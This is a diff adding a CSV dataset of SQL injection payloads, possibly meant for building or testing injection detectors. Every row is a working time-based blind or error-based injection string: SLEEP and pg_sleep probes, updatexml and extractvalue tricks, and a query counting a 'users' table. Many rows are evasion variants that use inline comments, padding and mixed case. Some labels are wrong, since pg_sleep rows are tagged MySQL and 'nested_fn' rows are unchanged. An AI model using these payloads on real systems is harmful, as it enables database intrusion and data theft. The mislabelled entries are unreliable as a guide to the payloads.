@@ -1,0 +1,681 @@
+Query,platform,base_type,original_id,transform_type,delay_value,obfuscation
+' AND 1=CASE WHEN (SLEEP(1) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,0,time-based-blind,1,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(1) ELSE NULL END )||',MySQL,boolean_or_error,1,time-based-blind,1,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(1), 0)--",MySQL,boolean_or_error,2,time-based-blind,1,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(1)))a)--,MySQL,boolean_or_error,3,time-based-blind,1,none
+"' OR updatexml(1,concat(0x7e,SLEEP(1)),1)--",MySQL,boolean_or_error,4,time-based-blind,1,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(1))))--",MySQL,boolean_or_error,5,time-based-blind,1,none
+'; SLEEP(1); -- ,MySQL,direct_time,6,time-based-none,1,none
+'; S/*obf*/LEEP(1); -- ,MySQL,direct_time,7,time-based-injected_comment,1,injected_comment
+';     SLEEP(1);  --    ,MySQL,direct_time,8,time-based-extra_spaces,1,extra_spaces
+'; SLEEP(1); -- ,MySQL,direct_time,9,time-based-nested_fn,1,nested_fn
+'; SlEep(1); -- ,MySQL,direct_time,10,time-based-mixed_case,1,mixed_case
+' AND 1=CASE WHEN (SLEEP(3) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,11,time-based-blind,3,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE NULL END )||',MySQL,boolean_or_error,12,time-based-blind,3,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(3), 0)--",MySQL,boolean_or_error,13,time-based-blind,3,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)--,MySQL,boolean_or_error,14,time-based-blind,3,none
+"' OR updatexml(1,concat(0x7e,SLEEP(3)),1)--",MySQL,boolean_or_error,15,time-based-blind,3,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(3))))--",MySQL,boolean_or_error,16,time-based-blind,3,none
+'; SLEEP(3); -- ,MySQL,direct_time,17,time-based-none,3,none
+'; S/*obf*/LEEP(3); -- ,MySQL,direct_time,18,time-based-injected_comment,3,injected_comment
+';   SLEEP(3);    --    ,MySQL,direct_time,19,time-based-extra_spaces,3,extra_spaces
+'; SLEEP(3); -- ,MySQL,direct_time,20,time-based-nested_fn,3,nested_fn
+'; slEEP(3); -- ,MySQL,direct_time,21,time-based-mixed_case,3,mixed_case
+' AND 1=CASE WHEN (SLEEP(5) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,22,time-based-blind,5,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END )||',MySQL,boolean_or_error,23,time-based-blind,5,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(5), 0)--",MySQL,boolean_or_error,24,time-based-blind,5,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--,MySQL,boolean_or_error,25,time-based-blind,5,none
+"' OR updatexml(1,concat(0x7e,SLEEP(5)),1)--",MySQL,boolean_or_error,26,time-based-blind,5,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(5))))--",MySQL,boolean_or_error,27,time-based-blind,5,none
+'; SLEEP(5); -- ,MySQL,direct_time,28,time-based-none,5,none
+'; S/*obf*/LEEP(5); -- ,MySQL,direct_time,29,time-based-injected_comment,5,injected_comment
+';    SLEEP(5);  --   ,MySQL,direct_time,30,time-based-extra_spaces,5,extra_spaces
+'; SLEEP(5); -- ,MySQL,direct_time,31,time-based-nested_fn,5,nested_fn
+'; Sleep(5); -- ,MySQL,direct_time,32,time-based-mixed_case,5,mixed_case
+' AND 1=CASE WHEN (SLEEP(7) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,33,time-based-blind,7,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE NULL END )||',MySQL,boolean_or_error,34,time-based-blind,7,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(7), 0)--",MySQL,boolean_or_error,35,time-based-blind,7,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(7)))a)--,MySQL,boolean_or_error,36,time-based-blind,7,none
+"' OR updatexml(1,concat(0x7e,SLEEP(7)),1)--",MySQL,boolean_or_error,37,time-based-blind,7,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(7))))--",MySQL,boolean_or_error,38,time-based-blind,7,none
+'; SLEEP(7); -- ,MySQL,direct_time,39,time-based-none,7,none
+'; S/*obf*/LEEP(7); -- ,MySQL,direct_time,40,time-based-injected_comment,7,injected_comment
+';   SLEEP(7);    --    ,MySQL,direct_time,41,time-based-extra_spaces,7,extra_spaces
+'; SLEEP(7); -- ,MySQL,direct_time,42,time-based-nested_fn,7,nested_fn
+'; SLEEp(7); -- ,MySQL,direct_time,43,time-based-mixed_case,7,mixed_case
+' AND 1=CASE WHEN (SLEEP(10) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,44,time-based-blind,10,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE NULL END )||',MySQL,boolean_or_error,45,time-based-blind,10,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(10), 0)--",MySQL,boolean_or_error,46,time-based-blind,10,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--,MySQL,boolean_or_error,47,time-based-blind,10,none
+"' OR updatexml(1,concat(0x7e,SLEEP(10)),1)--",MySQL,boolean_or_error,48,time-based-blind,10,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(10))))--",MySQL,boolean_or_error,49,time-based-blind,10,none
+'; SLEEP(10); -- ,MySQL,direct_time,50,time-based-none,10,none
+'; S/*obf*/LEEP(10); -- ,MySQL,direct_time,51,time-based-injected_comment,10,injected_comment
+';  SLEEP(10);     --     ,MySQL,direct_time,52,time-based-extra_spaces,10,extra_spaces
+'; SLEEP(10); -- ,MySQL,direct_time,53,time-based-nested_fn,10,nested_fn
+'; sleep(10); -- ,MySQL,direct_time,54,time-based-mixed_case,10,mixed_case
+' AND 1=CASE WHEN (SLEEP(1) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,55,time-based-blind,1,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(1) ELSE NULL END )||',MySQL,boolean_or_error,56,time-based-blind,1,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(1), 0)--",MySQL,boolean_or_error,57,time-based-blind,1,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(1)))a)--,MySQL,boolean_or_error,58,time-based-blind,1,none
+"' OR updatexml(1,concat(0x7e,SLEEP(1)),1)--",MySQL,boolean_or_error,59,time-based-blind,1,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(1))))--",MySQL,boolean_or_error,60,time-based-blind,1,none
+' AND SLEEP(1) -- ,MySQL,direct_time,61,time-based-none,1,none
+' AND S/*obf*/LEEP(1) -- ,MySQL,direct_time,62,time-based-injected_comment,1,injected_comment
+'    AND     SLEEP(1)   --    ,MySQL,direct_time,63,time-based-extra_spaces,1,extra_spaces
+' AND SLEEP(1) -- ,MySQL,direct_time,64,time-based-nested_fn,1,nested_fn
+' And sLEEp(1) -- ,MySQL,direct_time,65,time-based-mixed_case,1,mixed_case
+' AND 1=CASE WHEN (SLEEP(3) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,66,time-based-blind,3,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE NULL END )||',MySQL,boolean_or_error,67,time-based-blind,3,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(3), 0)--",MySQL,boolean_or_error,68,time-based-blind,3,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)--,MySQL,boolean_or_error,69,time-based-blind,3,none
+"' OR updatexml(1,concat(0x7e,SLEEP(3)),1)--",MySQL,boolean_or_error,70,time-based-blind,3,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(3))))--",MySQL,boolean_or_error,71,time-based-blind,3,none
+' AND SLEEP(3) -- ,MySQL,direct_time,72,time-based-none,3,none
+' AND S/*obf*/LEEP(3) -- ,MySQL,direct_time,73,time-based-injected_comment,3,injected_comment
+'    AND  SLEEP(3)   --  ,MySQL,direct_time,74,time-based-extra_spaces,3,extra_spaces
+' AND SLEEP(3) -- ,MySQL,direct_time,75,time-based-nested_fn,3,nested_fn
+' aNd sLEEP(3) -- ,MySQL,direct_time,76,time-based-mixed_case,3,mixed_case
+' AND 1=CASE WHEN (SLEEP(5) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,77,time-based-blind,5,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END )||',MySQL,boolean_or_error,78,time-based-blind,5,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(5), 0)--",MySQL,boolean_or_error,79,time-based-blind,5,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--,MySQL,boolean_or_error,80,time-based-blind,5,none
+"' OR updatexml(1,concat(0x7e,SLEEP(5)),1)--",MySQL,boolean_or_error,81,time-based-blind,5,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(5))))--",MySQL,boolean_or_error,82,time-based-blind,5,none
+' AND SLEEP(5) -- ,MySQL,direct_time,83,time-based-none,5,none
+' AND S/*obf*/LEEP(5) -- ,MySQL,direct_time,84,time-based-injected_comment,5,injected_comment
+'  AND  SLEEP(5)    --    ,MySQL,direct_time,85,time-based-extra_spaces,5,extra_spaces
+' AND SLEEP(5) -- ,MySQL,direct_time,86,time-based-nested_fn,5,nested_fn
+' anD SLEeP(5) -- ,MySQL,direct_time,87,time-based-mixed_case,5,mixed_case
+' AND 1=CASE WHEN (SLEEP(7) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,88,time-based-blind,7,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE NULL END )||',MySQL,boolean_or_error,89,time-based-blind,7,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(7), 0)--",MySQL,boolean_or_error,90,time-based-blind,7,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(7)))a)--,MySQL,boolean_or_error,91,time-based-blind,7,none
+"' OR updatexml(1,concat(0x7e,SLEEP(7)),1)--",MySQL,boolean_or_error,92,time-based-blind,7,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(7))))--",MySQL,boolean_or_error,93,time-based-blind,7,none
+' AND SLEEP(7) -- ,MySQL,direct_time,94,time-based-none,7,none
+' AND S/*obf*/LEEP(7) -- ,MySQL,direct_time,95,time-based-injected_comment,7,injected_comment
+'   AND   SLEEP(7)  --   ,MySQL,direct_time,96,time-based-extra_spaces,7,extra_spaces
+' AND SLEEP(7) -- ,MySQL,direct_time,97,time-based-nested_fn,7,nested_fn
+' and SlEEP(7) -- ,MySQL,direct_time,98,time-based-mixed_case,7,mixed_case
+' AND 1=CASE WHEN (SLEEP(10) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,99,time-based-blind,10,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE NULL END )||',MySQL,boolean_or_error,100,time-based-blind,10,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(10), 0)--",MySQL,boolean_or_error,101,time-based-blind,10,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--,MySQL,boolean_or_error,102,time-based-blind,10,none
+"' OR updatexml(1,concat(0x7e,SLEEP(10)),1)--",MySQL,boolean_or_error,103,time-based-blind,10,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(10))))--",MySQL,boolean_or_error,104,time-based-blind,10,none
+' AND SLEEP(10) -- ,MySQL,direct_time,105,time-based-none,10,none
+' AND S/*obf*/LEEP(10) -- ,MySQL,direct_time,106,time-based-injected_comment,10,injected_comment
+'     AND    SLEEP(10)     --    ,MySQL,direct_time,107,time-based-extra_spaces,10,extra_spaces
+' AND SLEEP(10) -- ,MySQL,direct_time,108,time-based-nested_fn,10,nested_fn
+' aND SlEEp(10) -- ,MySQL,direct_time,109,time-based-mixed_case,10,mixed_case
+' AND 1=CASE WHEN (SLEEP(1) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,110,time-based-blind,1,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(1) ELSE NULL END )||',MySQL,boolean_or_error,111,time-based-blind,1,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(1), 0)--",MySQL,boolean_or_error,112,time-based-blind,1,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(1)))a)--,MySQL,boolean_or_error,113,time-based-blind,1,none
+"' OR updatexml(1,concat(0x7e,SLEEP(1)),1)--",MySQL,boolean_or_error,114,time-based-blind,1,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(1))))--",MySQL,boolean_or_error,115,time-based-blind,1,none
+' OR SLEEP(1)#,MySQL,direct_time,116,time-based-none,1,none
+' OR S/*obf*/LEEP(1)#,MySQL,direct_time,117,time-based-injected_comment,1,injected_comment
+'   OR  SLEEP(1)#,MySQL,direct_time,118,time-based-extra_spaces,1,extra_spaces
+' OR SLEEP(1)#,MySQL,direct_time,119,time-based-nested_fn,1,nested_fn
+' Or sLEep(1)#,MySQL,direct_time,120,time-based-mixed_case,1,mixed_case
+' AND 1=CASE WHEN (SLEEP(3) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,121,time-based-blind,3,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE NULL END )||',MySQL,boolean_or_error,122,time-based-blind,3,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(3), 0)--",MySQL,boolean_or_error,123,time-based-blind,3,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)--,MySQL,boolean_or_error,124,time-based-blind,3,none
+"' OR updatexml(1,concat(0x7e,SLEEP(3)),1)--",MySQL,boolean_or_error,125,time-based-blind,3,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(3))))--",MySQL,boolean_or_error,126,time-based-blind,3,none
+' OR SLEEP(3)#,MySQL,direct_time,127,time-based-none,3,none
+' OR S/*obf*/LEEP(3)#,MySQL,direct_time,128,time-based-injected_comment,3,injected_comment
+'  OR    SLEEP(3)#,MySQL,direct_time,129,time-based-extra_spaces,3,extra_spaces
+' OR SLEEP(3)#,MySQL,direct_time,130,time-based-nested_fn,3,nested_fn
+' oR SLEEP(3)#,MySQL,direct_time,131,time-based-mixed_case,3,mixed_case
+' AND 1=CASE WHEN (SLEEP(5) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,132,time-based-blind,5,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END )||',MySQL,boolean_or_error,133,time-based-blind,5,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(5), 0)--",MySQL,boolean_or_error,134,time-based-blind,5,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--,MySQL,boolean_or_error,135,time-based-blind,5,none
+"' OR updatexml(1,concat(0x7e,SLEEP(5)),1)--",MySQL,boolean_or_error,136,time-based-blind,5,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(5))))--",MySQL,boolean_or_error,137,time-based-blind,5,none
+' OR SLEEP(5)#,MySQL,direct_time,138,time-based-none,5,none
+' OR S/*obf*/LEEP(5)#,MySQL,direct_time,139,time-based-injected_comment,5,injected_comment
+'  OR     SLEEP(5)#,MySQL,direct_time,140,time-based-extra_spaces,5,extra_spaces
+' OR SLEEP(5)#,MySQL,direct_time,141,time-based-nested_fn,5,nested_fn
+' Or sleEP(5)#,MySQL,direct_time,142,time-based-mixed_case,5,mixed_case
+' AND 1=CASE WHEN (SLEEP(7) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,143,time-based-blind,7,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE NULL END )||',MySQL,boolean_or_error,144,time-based-blind,7,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(7), 0)--",MySQL,boolean_or_error,145,time-based-blind,7,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(7)))a)--,MySQL,boolean_or_error,146,time-based-blind,7,none
+"' OR updatexml(1,concat(0x7e,SLEEP(7)),1)--",MySQL,boolean_or_error,147,time-based-blind,7,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(7))))--",MySQL,boolean_or_error,148,time-based-blind,7,none
+' OR SLEEP(7)#,MySQL,direct_time,149,time-based-none,7,none
+' OR S/*obf*/LEEP(7)#,MySQL,direct_time,150,time-based-injected_comment,7,injected_comment
+'    OR    SLEEP(7)#,MySQL,direct_time,151,time-based-extra_spaces,7,extra_spaces
+' OR SLEEP(7)#,MySQL,direct_time,152,time-based-nested_fn,7,nested_fn
+' or sLeep(7)#,MySQL,direct_time,153,time-based-mixed_case,7,mixed_case
+' AND 1=CASE WHEN (SLEEP(10) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,154,time-based-blind,10,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE NULL END )||',MySQL,boolean_or_error,155,time-based-blind,10,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(10), 0)--",MySQL,boolean_or_error,156,time-based-blind,10,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--,MySQL,boolean_or_error,157,time-based-blind,10,none
+"' OR updatexml(1,concat(0x7e,SLEEP(10)),1)--",MySQL,boolean_or_error,158,time-based-blind,10,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(10))))--",MySQL,boolean_or_error,159,time-based-blind,10,none
+' OR SLEEP(10)#,MySQL,direct_time,160,time-based-none,10,none
+' OR S/*obf*/LEEP(10)#,MySQL,direct_time,161,time-based-injected_comment,10,injected_comment
+'     OR     SLEEP(10)#,MySQL,direct_time,162,time-based-extra_spaces,10,extra_spaces
+' OR SLEEP(10)#,MySQL,direct_time,163,time-based-nested_fn,10,nested_fn
+' OR SlEeP(10)#,MySQL,direct_time,164,time-based-mixed_case,10,mixed_case
+' AND 1=CASE WHEN (SLEEP(1) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,165,time-based-blind,1,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(1) ELSE NULL END )||',MySQL,boolean_or_error,166,time-based-blind,1,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(1), 0)--",MySQL,boolean_or_error,167,time-based-blind,1,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(1)))a)--,MySQL,boolean_or_error,168,time-based-blind,1,none
+"' OR updatexml(1,concat(0x7e,SLEEP(1)),1)--",MySQL,boolean_or_error,169,time-based-blind,1,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(1))))--",MySQL,boolean_or_error,170,time-based-blind,1,none
+1 OR SLEEP(1),MySQL,direct_time,171,time-based-none,1,none
+1 OR S/*obf*/LEEP(1),MySQL,direct_time,172,time-based-injected_comment,1,injected_comment
+1    OR     SLEEP(1),MySQL,direct_time,173,time-based-extra_spaces,1,extra_spaces
+1 OR SLEEP(1),MySQL,direct_time,174,time-based-nested_fn,1,nested_fn
+1 or SlEep(1),MySQL,direct_time,175,time-based-mixed_case,1,mixed_case
+' AND 1=CASE WHEN (SLEEP(3) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,176,time-based-blind,3,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE NULL END )||',MySQL,boolean_or_error,177,time-based-blind,3,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(3), 0)--",MySQL,boolean_or_error,178,time-based-blind,3,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)--,MySQL,boolean_or_error,179,time-based-blind,3,none
+"' OR updatexml(1,concat(0x7e,SLEEP(3)),1)--",MySQL,boolean_or_error,180,time-based-blind,3,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(3))))--",MySQL,boolean_or_error,181,time-based-blind,3,none
+1 OR SLEEP(3),MySQL,direct_time,182,time-based-none,3,none
+1 OR S/*obf*/LEEP(3),MySQL,direct_time,183,time-based-injected_comment,3,injected_comment
+1     OR   SLEEP(3),MySQL,direct_time,184,time-based-extra_spaces,3,extra_spaces
+1 OR SLEEP(3),MySQL,direct_time,185,time-based-nested_fn,3,nested_fn
+1 or SLeeP(3),MySQL,direct_time,186,time-based-mixed_case,3,mixed_case
+' AND 1=CASE WHEN (SLEEP(5) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,187,time-based-blind,5,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END )||',MySQL,boolean_or_error,188,time-based-blind,5,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(5), 0)--",MySQL,boolean_or_error,189,time-based-blind,5,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--,MySQL,boolean_or_error,190,time-based-blind,5,none
+"' OR updatexml(1,concat(0x7e,SLEEP(5)),1)--",MySQL,boolean_or_error,191,time-based-blind,5,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(5))))--",MySQL,boolean_or_error,192,time-based-blind,5,none
+1 OR SLEEP(5),MySQL,direct_time,193,time-based-none,5,none
+1 OR S/*obf*/LEEP(5),MySQL,direct_time,194,time-based-injected_comment,5,injected_comment
+1     OR     SLEEP(5),MySQL,direct_time,195,time-based-extra_spaces,5,extra_spaces
+1 OR SLEEP(5),MySQL,direct_time,196,time-based-nested_fn,5,nested_fn
+1 or slEep(5),MySQL,direct_time,197,time-based-mixed_case,5,mixed_case
+' AND 1=CASE WHEN (SLEEP(7) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,198,time-based-blind,7,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE NULL END )||',MySQL,boolean_or_error,199,time-based-blind,7,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(7), 0)--",MySQL,boolean_or_error,200,time-based-blind,7,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(7)))a)--,MySQL,boolean_or_error,201,time-based-blind,7,none
+"' OR updatexml(1,concat(0x7e,SLEEP(7)),1)--",MySQL,boolean_or_error,202,time-based-blind,7,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(7))))--",MySQL,boolean_or_error,203,time-based-blind,7,none
+1 OR SLEEP(7),MySQL,direct_time,204,time-based-none,7,none
+1 OR S/*obf*/LEEP(7),MySQL,direct_time,205,time-based-injected_comment,7,injected_comment
+1   OR   SLEEP(7),MySQL,direct_time,206,time-based-extra_spaces,7,extra_spaces
+1 OR SLEEP(7),MySQL,direct_time,207,time-based-nested_fn,7,nested_fn
+1 or sLEeP(7),MySQL,direct_time,208,time-based-mixed_case,7,mixed_case
+' AND 1=CASE WHEN (SLEEP(10) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,209,time-based-blind,10,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE NULL END )||',MySQL,boolean_or_error,210,time-based-blind,10,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(10), 0)--",MySQL,boolean_or_error,211,time-based-blind,10,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--,MySQL,boolean_or_error,212,time-based-blind,10,none
+"' OR updatexml(1,concat(0x7e,SLEEP(10)),1)--",MySQL,boolean_or_error,213,time-based-blind,10,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(10))))--",MySQL,boolean_or_error,214,time-based-blind,10,none
+1 OR SLEEP(10),MySQL,direct_time,215,time-based-none,10,none
+1 OR S/*obf*/LEEP(10),MySQL,direct_time,216,time-based-injected_comment,10,injected_comment
+1   OR     SLEEP(10),MySQL,direct_time,217,time-based-extra_spaces,10,extra_spaces
+1 OR SLEEP(10),MySQL,direct_time,218,time-based-nested_fn,10,nested_fn
+1 Or sLeep(10),MySQL,direct_time,219,time-based-mixed_case,10,mixed_case
+' AND 1=CASE WHEN (SLEEP(1) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,220,time-based-blind,1,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(1) ELSE NULL END )||',MySQL,boolean_or_error,221,time-based-blind,1,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(1), 0)--",MySQL,boolean_or_error,222,time-based-blind,1,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(1)))a)--,MySQL,boolean_or_error,223,time-based-blind,1,none
+"' OR updatexml(1,concat(0x7e,SLEEP(1)),1)--",MySQL,boolean_or_error,224,time-based-blind,1,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(1))))--",MySQL,boolean_or_error,225,time-based-blind,1,none
+"' AND IF(1=1, SLEEP(1), 0) -- ",MySQL,direct_time,226,time-based-none,1,none
+"' AND IF(1=1, S/*obf*/LEEP(1), 0) -- ",MySQL,direct_time,227,time-based-injected_comment,1,injected_comment
+"'  AND     IF(1=1,   SLEEP(1),   0)    --  ",MySQL,direct_time,228,time-based-extra_spaces,1,extra_spaces
+"' AND IF(1=1, SLEEP(1), 0) -- ",MySQL,direct_time,229,time-based-nested_fn,1,nested_fn
+"' anD iF(1=1, sleeP(1), 0) -- ",MySQL,direct_time,230,time-based-mixed_case,1,mixed_case
+' AND 1=CASE WHEN (SLEEP(3) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,231,time-based-blind,3,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE NULL END )||',MySQL,boolean_or_error,232,time-based-blind,3,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(3), 0)--",MySQL,boolean_or_error,233,time-based-blind,3,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)--,MySQL,boolean_or_error,234,time-based-blind,3,none
+"' OR updatexml(1,concat(0x7e,SLEEP(3)),1)--",MySQL,boolean_or_error,235,time-based-blind,3,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(3))))--",MySQL,boolean_or_error,236,time-based-blind,3,none
+"' AND IF(1=1, SLEEP(3), 0) -- ",MySQL,direct_time,237,time-based-none,3,none
+"' AND IF(1=1, S/*obf*/LEEP(3), 0) -- ",MySQL,direct_time,238,time-based-injected_comment,3,injected_comment
+"'   AND   IF(1=1,   SLEEP(3),     0)   --  ",MySQL,direct_time,239,time-based-extra_spaces,3,extra_spaces
+"' AND IF(1=1, SLEEP(3), 0) -- ",MySQL,direct_time,240,time-based-nested_fn,3,nested_fn
+"' And iF(1=1, slEeP(3), 0) -- ",MySQL,direct_time,241,time-based-mixed_case,3,mixed_case
+' AND 1=CASE WHEN (SLEEP(5) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,242,time-based-blind,5,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END )||',MySQL,boolean_or_error,243,time-based-blind,5,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(5), 0)--",MySQL,boolean_or_error,244,time-based-blind,5,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--,MySQL,boolean_or_error,245,time-based-blind,5,none
+"' OR updatexml(1,concat(0x7e,SLEEP(5)),1)--",MySQL,boolean_or_error,246,time-based-blind,5,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(5))))--",MySQL,boolean_or_error,247,time-based-blind,5,none
+"' AND IF(1=1, SLEEP(5), 0) -- ",MySQL,direct_time,248,time-based-none,5,none
+"' AND IF(1=1, S/*obf*/LEEP(5), 0) -- ",MySQL,direct_time,249,time-based-injected_comment,5,injected_comment
+"'  AND  IF(1=1,   SLEEP(5),   0)   --  ",MySQL,direct_time,250,time-based-extra_spaces,5,extra_spaces
+"' AND IF(1=1, SLEEP(5), 0) -- ",MySQL,direct_time,251,time-based-nested_fn,5,nested_fn
+"' anD iF(1=1, SleEp(5), 0) -- ",MySQL,direct_time,252,time-based-mixed_case,5,mixed_case
+' AND 1=CASE WHEN (SLEEP(7) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,253,time-based-blind,7,none
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE NULL END )||',MySQL,boolean_or_error,254,time-based-blind,7,none
+"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(7), 0)--",MySQL,boolean_or_error,255,time-based-blind,7,none
+' AND (SELECT 1 FROM (SELECT(SLEEP(7)))a)--,MySQL,boolean_or_error,256,time-based-blind,7,none
+"' OR updatexml(1,concat(0x7e,SLEEP(7)),1)--",MySQL,boolean_or_error,257,time-based-blind,7,none
+"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(7))))--",MySQL,boolean_or_error,258,time-based-blind,7,none
+"' AND IF(1=1, SLEEP(7), 0) -- ",MySQL,direct_time,259,time-based-none,7,none
+"' AND IF(1=1, S/*obf*/LEEP(7), 0) -- ",MySQL,direct_time,260,time-based-injected_comment,7,injected_comment
+"'   AND  IF(1=1,     SLEEP(7),   0)     --   ",MySQL,direct_time,261,time-based-extra_spaces,7,extra_spaces
+"' AND IF(1=1, SLEEP(7), 0) -- ",MySQL,direct_time,262,time-based-nested_fn,7,nested_fn
+"' and if(1=1, slEEP(7), 0) -- ",MySQL,direct_time,263,time-based-mixed_case,7,mixed_case
